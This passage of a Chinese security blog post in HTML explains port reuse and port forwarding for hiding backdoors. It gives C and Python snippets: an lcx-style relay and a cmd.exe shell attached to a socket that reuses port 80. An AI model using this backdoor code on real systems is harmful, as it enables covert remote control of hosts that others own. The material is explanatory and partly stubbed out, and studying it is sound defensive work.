&#123;</span><br><span class="line">			send(ss, buf, num, 0);</span><br><span class="line">		&#125;</span><br><span class="line">		else if (num == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	closesocket(ss);</span><br><span class="line">	closesocket(conn_sock);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还有一种方法就是端口转发达到端口复用的效果，我们用lcx等端口转发工具也可以实现同等效果,不过隐蔽性就不是很好了，不过还是提一下吧。</p>
+<p>下面是<code>python</code>代码实现<code>lcx</code>的端口转发功能,由于篇幅限制,就只写出核心代码。</p>
+<p>首先定义两个函数，一个<code>server</code>端和一个<code>connect</code>端，<code>server</code>用于绑定端口，<code>connect</code>用于连接转发端口。</p>
+<p>这里的<code>select</code>来处理套接字阻塞问题，<code>get_stream()</code>函数用于交换<code>sock</code>流对象,这样做的好处是双方分工明确,避免混乱,<code>ex_stream()</code>函数用于流对象的数据转发。<code>Connect()</code>函数里多了个时间控制，控制连接超时和等待连接，避免连接出错异常。</p>
+<p>然而事实是<code>select</code>控制阻塞后，<code>3389</code>端口的连接无法正常通信，其他短暂性连接套接字不受影响。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">def get_stream(flag):</span><br><span class="line">   pass</span><br><span class="line">def ex_stream(host, port, flag, server1, server2):</span><br><span class="line">   pass</span><br><span class="line">def server(port, flag):</span><br><span class="line">    host = &apos;0.0.0.0&apos;</span><br><span class="line">    server = create_socket()</span><br><span class="line">    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    server.bind((host, port))</span><br><span class="line">    server.listen(10)</span><br><span class="line">    while True:</span><br><span class="line"> 		infds,outfds,errfds=select.select([server,],[],[],5)</span><br><span class="line">        if len(infds)!= 0: </span><br><span class="line">            conn, addr = server.accept()</span><br><span class="line">            print (&apos;[+] Connected from: %s:%s&apos; % (addr,port))</span><br><span class="line">            streams[flag] = conn</span><br><span class="line">            server_sock2 = get_stream(flag) </span><br><span class="line">            ex_stream(host, port, flag, conn, server_sock2)</span><br><span class="line">        </span><br><span class="line">def connect(host, port, flag):</span><br><span class="line">    connet_timeout = 0</span><br><span class="line">    wait_time = 30</span><br><span class="line">    timeout = 5</span><br><span class="line">    while True:</span><br><span class="line">        if connet_timeout &gt; timeout:</span><br><span class="line">            streams[flag] = &apos;Exit&apos;</span><br><span class="line">            print (&apos;[-] Not connected %s:%i!&apos; % (host,port))</span><br><span class="line">            return None</span><br><span class="line">        conn_sock = create_socket()</span><br><span class="line">        try:</span><br><span class="line">            conn_sock.connect((host, port))</span><br><span class="line">        except Exception, e:</span><br><span class="line">            print (&apos;[-] Can not connect %s:%i!&apos; % (host, port))</span><br><span class="line">            connet_timeout += 1</span><br><span class="line">            time.sleep(wait_time)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        print &quot;[+] Connected to %s:%i&quot; % (host, port)</span><br><span class="line">        streams[flag] = conn_sock</span><br><span class="line">        conn_sock2 = get_stream(flag) </span><br><span class="line">        ex_stream(host, port, flag, conn_sock, conn_sock2)</span><br></pre></td></tr></table></figure>
+<p><strong>（一）：端口复用</strong></p>
+<p>端口复用的原理是与源端口占用程序监听同一端口，当复用端口有数据来时，我们可以判断是否是自己的数据包，如果是自己的，那么就自己处理，否则把数据包交给源端口占用程序处理。</p>
+<p>在这里有个问题就是，如果你不处理数据包的归属问题的话，那么这个端口就会被端口复用程序占用，从而导致源端口占用程序无法工作。</p>
+<blockquote>
+<p>外部IP：192.168.2.1=&gt;192.168.1.1:80=&gt;run(data)</p>
+<p>内部IP：return(data)=&gt;192.168.1.1:80=&gt;192.168.2.1</p>
+</blockquote>
+<p>代码以cmd后门为例，我们还是先创建一个TCP套接字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listenSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);</span><br></pre></td></tr></table></figure>
+<p>设置<code>socket</code>可复用<code>SO_REUSEADDR</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BOOL val = TRUE;</span><br><span class="line">setsockopt(listenSock, SOL_SOCKET, SO_REUSEADDR, (char*)&amp;val, sizeof(val));</span><br></pre></td></tr></table></figure>
+<p>设置IP和复用端口号，IP和端口号视情况而定。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sockaddr_in sockaaddr;</span><br><span class="line">sockaaddr.sin_addr.s_addr = inet_addr(&quot;192.168.1.8&quot;);</span><br><span class="line">sockaaddr.sin_family = AF_INET;</span><br><span class="line">sockaaddr.sin_port = htons(80);</span><br></pre></td></tr></table></figure>
+<p>设置反弹的程序，以<code>cmd.exe</code>为例，首先创建窗口特性并初始化为<code>CreateProcess()</code>创建进程做准备，当<code>cmd.exe</code>的进程创建成功后，以<code>socket</code>进行数据通信交换，这里还可以换成其他程序,比如<code>Shellcode</code>小马接收器、写入文件程序、后门等等。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFO si;</span><br><span class="line">ZeroMemory(&amp;si, sizeof(si));</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">si.hStdError = si.hStdInput = si.hStdOutput = (void*)recvSock;</span><br><span class="line"></span><br><span class="line">char cmdLine[] = &quot;cmd&quot;;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">ret = CreateProcess(NULL, cmdLine, NULL, NULL, 1, 0, NULL, NULL, &amp;si, &amp;pi);</span><br></pre></td></tr></table></figure>
+<h3 id="0x05总结"><a href="#0x05总结" class="headerlink" title="0x05总结"></a>0x05总结</h3><p>在端口复用技术中，确实有许多的坑点。其实只要我们知道其中的特性，绕过也是不难的。端口复用在Linux系统中我觉得还好，但是端口复用这个技术放到Windows系统中，我觉得端口复用就好像是千斤顶，换备胎的时候可以用下，不可长时间使用，否则会出现问题的（^__^）。</p>
+
+        </div>
+		<!--dashang-->
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/端口复用/">端口复用</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文内容仅作为作者个人兴趣与观点,若有不恰当之处，望不吝赐教</p>
+    
+    
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help" >帮助</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="友情链接">友情链接</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+        </p>
+        <p>
+            Blog by <a href="https://github.com/hucmosin" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+    </div>
+</footer>
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script src="/js/InsightSearch.js"></script>
+<script src="/js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '10/20/2017',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            wxMpImg: '/images/weixin-mp.png',
+        });
+    });
+</script>
+</body>
+</html>
